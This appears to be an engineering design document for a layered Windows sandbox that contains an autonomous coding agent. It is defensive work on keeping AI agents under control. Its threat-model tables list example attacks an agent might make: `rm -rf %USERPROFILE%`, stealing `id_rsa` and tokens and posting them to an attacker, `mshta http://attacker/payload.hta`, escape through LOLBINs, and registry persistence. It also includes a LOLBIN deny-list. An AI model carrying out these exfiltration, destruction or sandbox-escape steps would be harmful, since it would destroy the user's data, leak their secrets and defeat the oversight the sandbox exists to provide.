# MXC agentic-sandbox v1 — architecture

Spike branch context: `user/gudge/projfs_t3_spike` (mxc.yellow), tip `12daf3e`.
This doc consolidates the architecture discussion that followed the
ProjFS-T3 spike findings (`../downlevel_support/projfs-t3-spike-step{1,2,3}.md`).

The ProjFS-T3 work answered "can we project a filesystem view into an
AppContainer." This doc answers the broader question: **given an
autonomous agent running developer-tool workloads on a developer's
machine, what's the complete isolation architecture?**

## Scope

In scope:

- The contained workload is agent-driven developer tooling:
  `git`, `msbuild`, `cmake`, `cl.exe`/`link.exe`, `gcc`, `cargo`, `ninja`,
  `nmake`, related toolchains.
- The runtime environment is the developer's own Windows machine
  (Win11 23H2+ today; future-Windows asks called out where relevant).
- The agent runs as the developer's own user account — there is no
  separate tenant identity.

Out of scope:

- Sandboxing arbitrary GUI Win32 apps (Office, Photoshop, etc.). That's
  Win32 App Isolation territory; different threat model, different
  compatibility surface.
- Multi-tenant cloud isolation. The threat model here is "one user, one
  agent, one box."
- Hardware side-channels (cache timing, power analysis). Software
  sandbox can't address these.
- Social engineering. Out of any technical sandbox.

## Threat model

The agent runs as the developer's user account and inherits that
account's nominal access to the filesystem, registry, network, and other
user-owned processes. **The threat is the agent's autonomous behavior**
— either the LLM driving the agent or the tools the agent invokes acting
outside the developer's intent. Specifically:

- **Destructive actions**: agent runs `rm -rf` / `git clean` in the wrong
  directory, deletes user files, modifies source files outside the
  intended scope, drops persistence into Run keys or scheduled tasks.
- **Exfiltration**: agent reads `~/.ssh/id_rsa`, browser cookie jars,
  credential manager contents, source code from repos unrelated to the
  current task, `.npmrc`/`.git-credentials` files containing tokens —
  and ships them out over the network.
- **Process compromise**: agent invokes a signed Microsoft binary
  (LOLBIN) to escape the sandbox; attacks long-lived helper processes
  the agent legitimately needs (`mspdbsrv.exe`); attempts to debug other
  user-owned processes via `OpenProcess`.

We trust:

- The developer (they intentionally launched MXC + the agent).
- The toolchain installation (signed Microsoft / vendor binaries; if
  vulnerable, exploiting them still gives only agent-level privilege).
- The host OS kernel and built-in services.
- The MXC broker service (privileged setup component; standard service
  hardening applies).

We do not trust:

- The agent's code or any code it generates.
- The agent's instructions / prompts.
- Tools the agent invokes acting outside their documented behavior.

## Attack-vector inventory

| Vector | Concrete example |
|--------|------------------|
| Filesystem read of sensitive data | Agent reads `~/.ssh/id_rsa`, browser cookies, `.aws/credentials`, `.npmrc` with tokens, `gh` CLI config, GnuPG dir, Outlook PST, Teams/Slack data |
| Filesystem destruction | `rm -rf %USERPROFILE%`; truncate the developer's personal docs; corrupt a sibling repo |
| Filesystem persistence | Drop a malicious git pre-commit hook; modify VS settings; plant a DLL on a loader-search path |
| Registry persistence | Add `HKCU\…\Run`; hijack a file association; modify `HKCU\Environment\PATH` |
| Network exfiltration | POST `id_rsa` to attacker over HTTPS / DNS-over-HTTPS / WebSocket / pastebin |
| Process escape | `mshta`/`regsvr32`/`rundll32`/`bitsadmin` to spawn outside the silo |
| Service / scheduled-task abuse | Create a scheduled task or service to run after the agent run ends |
| Inter-process attack on user-owned processes | `OpenProcess` Notepad/browser/IDE to read memory or inject |
| Side-channel / IPC | Named pipes, mailslots, shared memory to talk to other user processes |
| Toolchain compromise via working tree | Plant a `cmake.exe` shim in the repo; the build picks it up via PATH |

## The nine-layer architecture

| # | Layer | What it stops | Existing 23H2+ mechanism |
|---|-------|---------------|---------------------------|
| 1 | **Silo** wrapping the job | Object-namespace escape; cross-silo IPC; child processes escaping the boundary | `JobObjectCreateSilo` (admin broker required) |
| 2 | **BindFlt** in the silo | Filesystem read of denied paths; filesystem writes outside writepaths; persistence at known FS locations | `BfSetupFilter` — tombstones for deny, read-only overlays for write-restrict, read-write overlays for explicit writepaths |
| 3 | **Per-silo registry view** | Persistence via Run keys / services / scheduled tasks; file-association hijacking; PATH/environment poisoning | Silo's isolated registry hives (verify completeness per-build) |
| 4 | **Restricted Token** | Privilege-based attacks: load driver, take ownership, debug other processes, manage volumes, create services | `CreateRestrictedToken` dropping `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeTakeOwnershipPrivilege`, `SeManageVolumePrivilege`, `SeLoadDriverPrivilege`, `SeShutdownPrivilege`, `SeCreateServicePrivilege`. Drop Administrators group if present. |
| 5 | **Mandatory Integrity Level: Low** (or Untrusted) | Cross-IL writes to user files; cross-IL `OpenProcess` of Medium-IL processes | Set via token's mandatory label |
| 6 | **Job Object** UI/process/resource limits | Clipboard injection; spawning processes outside the job; active-process explosion; orphan processes after run end | `JOB_OBJECT_LIMIT_BREAKAWAY_OK` cleared; `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`; `JobObjectExtendedLimitInformation`; UI limits via `JobObjectBasicUIRestrictions` |
| 7 | **Network policy** — default-deny outbound + per-tenant proxy | All network-based exfiltration | Localhost proxy that the agent must use, gated allow-list of destinations, audit log of every connection. Per-silo WFP rules where feasible. |
| 8 | **Audit / ETW logging** | Catches what slips through; informs incident response | MXC logger + ETW from prjflt/BindFlt/process-create/registry-filter |
| 9 | **Process-creation policy** (LOLBIN block) | Use of signed Microsoft binaries for escape | Per-silo image-load allow-list or deny-list; can be implemented via job's `JobObjectAssociateCompletionPort` + image-load notification + selective `TerminateProcess`, or via a kernel callback registered by the broker |

### Filesystem detail (layer 2)

BindFlt mappings, in priority order, scoped to the silo:

1. **Tombstones** on every path in `deniedPaths` — denies all access
   regardless of whether the path exists on the host. Covers both the
   "deny existing sub-path" case and the "deny path that doesn't exist
   yet" case in a single primitive.
2. **Read-only overlay** on `%USERPROFILE%\` (or whatever broader root
   contains both writepaths and most of the user's files). Denies all
   writes by default.
3. **Read-write overlay** per explicit writepath — these come LAST so
   they win on the more-specific path and unlock writes within their
   subtree.
4. **Read-only overlay** on `%ProgramFiles%\`, `%ProgramFiles(x86)%\`,
   `%SystemRoot%\System32\` — defense in depth against tool-installation
   tampering even though those paths are typically write-DACLed already.

Composition relies on BindFlt's "more specific wins" semantic. Verify
per build (see spike #2).

### Registry detail (layer 3)

The persistence-via-registry threats are concentrated in:

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` and its variants
- `HKCU\Software\Classes\…\shell\open\command` (file-association hijack)
- `HKCU\Environment` (PATH and other env vars)

If the silo provides a per-silo `HKCU` (or `HKCU\Software` subset), all
writes the agent makes evaporate at silo teardown. Server Containers
work this way. Verify on Win11 client SKUs (see spike #2).

If silo's default registry view isn't isolated enough, options:
- Use the kernel registry-callback API (`CmRegisterCallback`) to filter
  writes per silo.
- Build a small registry minifilter — heavier; only if the above
  doesn't suffice.

### Network detail (layer 7)

Default-deny outbound is the only defensible posture. Practical shape:

- A localhost proxy (per silo or per machine with silo-aware routing)
  intercepts all outbound HTTPS.
- The proxy enforces a per-run allow-list of destinations. Typical
  defaults: package registries (npmjs.org, nuget.org, vcpkg, crates.io),
  the developer's source-control hostname (e.g., `github.com`,
  `dev.azure.com`).
- Raw socket / DNS / SMB outbound is denied at the firewall.
- Every connection attempt — allowed and denied — is logged.

Agent attempts at exfiltration via DNS-over-HTTPS, paste-bin services,
WebSocket, etc., all funnel through the proxy and hit the allow-list
check.

### Process-creation detail (layer 9)

The well-known LOLBIN list (`mshta`, `regsvr32`, `rundll32`, `bitsadmin`,
`certutil`, `installutil`, `msbuild` itself in some configurations,
`wmic`, `cscript`/`wscript`, etc.) is a moving target — the agent's
tools are mostly fine but specific images shouldn't run inside the
silo. Reasonable defaults:

- Allow-list: the toolchain executables and shells the developer
  explicitly authorized (`cl.exe`, `link.exe`, `cmake.exe`, `git.exe`,
  `msbuild.exe`, `node.exe`, `python.exe`, `pwsh.exe`/`cmd.exe`, …).
- Deny-list: the canonical LOLBINs.
- Default policy for unmatched: allow (developer convenience) or deny
  (max-security). Probably configurable.

Implementation surface: broker registers a kernel image-load callback,
or the silo uses an AppLocker-like per-silo policy.

## Vector → layer coverage matrix

| Threat | Layer that stops it | How |
|--------|---------------------|-----|
| Read `~/.ssh/id_rsa` | 2 | BindFlt tombstone on `%USERPROFILE%\.ssh\` |
| Read browser cookies | 2 | BindFlt tombstone on Chrome/Edge/Firefox profile dirs |
| Read Credential Manager | 2 + 5 | BindFlt tombstone + Low IL prevents DPAPI master-key access |
| `rm -rf %USERPROFILE%` | 2 | BindFlt RO overlay on profile minus writepaths |
| Delete repo files (in-scope) | (allowed) | Repo is a writepath; this is intended agent behavior |
| Write `HKCU\…\Run` | 3 | Per-silo HKCU; write lands in silo-local hive, gone at teardown |
| `bcdedit` / `format C:` | 4 + 5 | Restricted token drops `SeManageVolume`; Low IL blocks volume management |
| POST `id_rsa` over HTTPS | 7 | Proxy intercepts; allow-list rejects non-allowed destinations; audit log |
| DNS-over-HTTPS exfil | 7 | Proxy blocks; firewall blocks raw DNS to non-loopback resolvers |
| `OpenProcess` user-owned Notepad | 4 + 5 | `SeDebugPrivilege` dropped; cross-IL `OpenProcess` requires it even within the same user |
| Install service | 4 | `SeCreateServicePrivilege` dropped; SCM rejects |
| Create scheduled task | 3 + 4 | Task scheduler RPC writes go through registry + service; both gated |
| `mshta http://attacker/payload.hta` | 7 + 9 | Network proxy blocks the fetch; LOLBIN block refuses `mshta` |
| `JOB_OBJECT_LIMIT_BREAKAWAY_OK` escape | 1 + 6 | BREAKAWAY cleared on parent job; silo also catches what slips |
| Read Outlook PST | 2 | Tombstone on `%LOCALAPPDATA%\Microsoft\Outlook\` |
| Steal NPM token from `.npmrc` | 2 | Tombstone on `.npmrc` (file-level if BindFlt supports it, else parent dir) |
| Inject DLL on loader-search path | 2 + 5 | Loader-search dirs are read-only overlays; Low IL blocks writes |
| Plant `cmake.exe` shim in repo to subvert build | (partial) | Repo IS a writepath, so agent can plant the shim. Mitigation: pin toolchain path in the build environment; agent shouldn't change `PATH`. Layer 3 (per-silo registry) prevents persistent `HKCU\Environment\PATH` changes. |

## Residual risks

Each is a deliberate non-goal of v1, with rationale:

- **Toolchain pinning vs working-tree shim**. If the agent plants a
  `cmake.exe` in the repo and the build environment's `PATH` searches
  the working directory first, the agent's shim runs. Mitigation: the
  silo's environment sets `PATH` explicitly to toolchain locations
  first; the working-tree shim is shadowed. This is a configuration
  choice, not a primitive.
- **Side channels** (cache timing, CPU power). Software sandbox cannot
  address.
- **Toolchain vulnerabilities**. If `cl.exe` has a remote-exploitable
  bug and the agent's source code triggers it, the exploit runs at
  agent privilege — which is sandboxed. So the blast radius is the
  silo, not the host. Mitigation: pin known-good toolchain version per
  silo; keep MSRC patches current.
- **Proxy single point of failure (layer 7)**. If the allow-list is
  wrong, exfiltration succeeds. Mitigation: out-of-band audit log
  review; conservative defaults; per-run user confirmation for novel
  destinations.
- **The MXC broker service itself**. Part of the TCB; admin-installed;
  standard service hardening applies (signed binary, no remote
  attack surface, restart-on-crash with rate limiting).
- **Agent recruits the user to bypass the sandbox**. Social engineering
  is out of scope.

## Why not just AppContainer?

The earlier ProjFS-T3 spike used AppContainer as the contained
principal. For agentic devloops the AC + LowBox model is unnecessarily
restrictive in some dimensions and unnecessarily permissive in others:

- **Unnecessarily restrictive**: AC's LowBox check requires AC-SID
  grants on every path the agent must read. The developer's toolchain
  and repo don't have those grants by default, so we'd need to add
  them via DACL mutation (the issue with descendant walks, traversal
  chain, and AAP inheritance the prior turns identified) OR via BFS
  allow-listing (currently flaky on existing Windows). Neither is
  attractive.
- **Unnecessarily permissive in the relevant axes**: AC's main job is
  isolating from the user's broader desktop state (clipboard, named
  objects, Win32k surface). For a CLI build, those don't matter much
  — there's no UI integration to abuse. The agent is in a CLI loop.

Dropping AC and running as the user inside a silo + restricted token
+ Low IL + BindFlt gives us:

- Natural read access to the toolchain (user has it).
- Natural write access to the repo (user has it).
- Per-tenant filesystem deny via BindFlt without DACL mutation.
- Restricted-token + Low IL to bound what privileges the agent can use.
- Silo for kernel-object isolation.
- All without paying for AC's user-path-access compatibility tax.

## Why not just ProjFS?

ProjFS shines when the agent should see a *curated, minimal namespace*:
specifically-listed allowed paths, nothing else exists. For agentic
devloops the policy shape is closer to "see almost everything,
specifically forbid these few subtrees" — the inverse. Projecting
"almost everything" into a synthetic root requires either heavy
projection (expensive, breaks path identity) or a mixed view where
some paths are projected and others fall through to NTFS (confusing
to reason about; loses the structural-deny guarantee).

ProjFS-T3 stays on the menu for:

- Multi-tenant agent runs that should see disjoint working trees.
- Speculative agent edits that shouldn't touch the developer's real
  working tree.
- Read-from-remote-store toolchains (rare in devloops; common in CI).

But it's not the centerpiece for the developer-workstation case.

## Implementation plan

### Phase 0 — empirical bring-up

Confirm the primitives work as described before committing to the
architecture. Spike priorities (rough order):

1. **End-to-end build inside silo + BindFlt + restricted token + Low
   IL**. Pick a representative repo (e.g., mxc.green itself), build
   with msbuild/cmake, confirm completion. Loadbearing question.
2. **Per-silo HKCU behavior on Win11 23H2 / 24H2 / 25H2**. Determine
   whether silo's default registry isolation covers persistence
   vectors, or whether we need a custom registry callback.
3. **BindFlt tombstone semantics across all `CreateFile` dispositions**
   (`FILE_OPEN`, `FILE_CREATE`, `FILE_OPEN_IF`, `FILE_OVERWRITE`,
   `FILE_OVERWRITE_IF`), both for existing-path tombstones and
   non-existent-path tombstones. Determine the precise error code
   returned to the agent (`ERROR_PATH_NOT_FOUND` vs
   `ERROR_ACCESS_DENIED`).
4. **Localhost proxy + WFP-per-silo network policy**. Stand up the
   proxy; route traffic; verify allow-list enforcement.
5. **LOLBIN allow-list / deny-list mechanism**. Either via image-load
   notification callback or per-silo AppLocker-equivalent.
6. **Attack-replay end-to-end**. Take the threat-inventory table and
   walk every row through the implemented stack. Each must be blocked
   by at least one layer.

Total estimated effort for phase 0: **3–4 weeks** for one engineer.

### Phase 1 — production implementation

Once phase 0 confirms the architecture is sound:

| Component | Estimate |
|-----------|----------|
| Silo creation + BindFlt mapping orchestration in a broker service | ~2 weeks |
| Restricted-token + IL setup for the contained process | ~1 week |
| Per-tenant package-cache overlay (BindFlt read-only + scratch overlay) | ~1 week |
| `mspdbsrv` and other long-lived helper lifecycle | ~few days |
| Network policy integration (localhost proxy + firewall per silo) | ~1.5 weeks |
| Registry isolation (silo default + custom callback if needed) | ~1–2 weeks (depending on spike #2) |
| Process-creation policy (allow/deny list, kernel callback or per-silo AppLocker) | ~1.5 weeks |
| End-to-end test harness for the threat model | ~1 week |
| Documentation + SDK / config surface | ~1 week |

Total phase 1: **~8–10 weeks** for one engineer.

### Phase 2 — hardening, telemetry, productionization

- Audit-log shape and retention.
- Operator UX for reviewing what the agent did.
- Allow-list governance for the network proxy.
- Recovery from broker crash / silo orphans.
- Performance tuning.

Out of scope for this design doc.

## Open questions / deferred decisions

These are flagged so they can be answered explicitly later rather than
inheriting whatever the implementation happens to do:

1. **Per-silo HKCU completeness on Win11 client SKUs.** Server SKUs
   have full silo registry isolation; client SKUs may be partial.
   Drives whether we need a custom registry callback (layer 3).
2. **Allow-list default for unmatched executables** in layer 9. Allow
   (developer convenience) vs deny (max security). Probably user-
   configurable; needs a default.
3. **Package-cache policy**: pass-through (cross-tenant contamination
   risk), read-only-with-overlay (slower first build, isolated), or
   per-tenant cache (slowest, fully isolated). Different policies
   probably make sense for different agent classes.
4. **Network allow-list default**: what hostnames are pre-approved?
   github.com? nuget.org? npmjs.org? Microsoft Symbol Server? The
   defaults matter and shouldn't be derived ad hoc.
5. **How the agent discovers its working dir**: env var, well-known
   path, both?
6. **Telemetry destination**: where do audit logs go, how long are
   they kept, who can read them?
7. **Broker upgrade story**: in-place upgrade of the broker service
   while a silo is running.

## Relationship to other MXC work

- **ProjFS-T3 spike** (`../downlevel_support/projfs-t3-spike-step{1,2,3}.md`):
  proven this session; remains the right tool for the curated-whitelist
  policy shape; complementary to (not competing with) this architecture.
- **DACL-T3** (mxc.green `phase3`–`phase6` branches): superseded for
  the agentic-devloop use case by the silo + BindFlt approach;
  remains relevant for any tier that needs to ACL-augment host paths
  for whatever reason.
- **BaseContainer / IsolationSession**: independent tiers; both
  could in principle be wrapped in a silo + BindFlt outer shell.
  Whether to do so depends on whether their existing primitives
  satisfy the threat model on their own.

## Reproduce / next session

If picking this up in a new session:

```powershell
cd D:\git\microsoft\mxc\mxc.yellow
git log --oneline -20    # spike branch state
ls docs\proposals\agent-isolation
ls docs\proposals\downlevel_support\projfs-t3-spike-step*.md
```

Start phase 0 spike #1 (end-to-end build in the architecture)
against the existing mxc.yellow source tree as the test target.
